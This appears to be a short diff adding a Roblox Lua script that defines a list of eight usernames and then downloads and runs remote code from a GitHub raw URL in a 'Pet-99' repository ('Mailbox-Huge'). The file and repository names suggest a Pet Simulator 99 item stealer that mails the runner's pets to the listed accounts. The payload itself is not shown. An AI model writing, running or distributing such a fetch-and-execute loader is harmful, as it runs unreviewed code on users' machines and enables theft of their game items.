@@ -1,0 +1,3 @@
+getgenv().usernames = {"boudo_4uz", "berez1xg", "seitz5ut", "gills6ii", "vermi4dm", "bozzo_3a9", "pavel7m6", "elftm4vw"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/Mailbox-Huge"))()
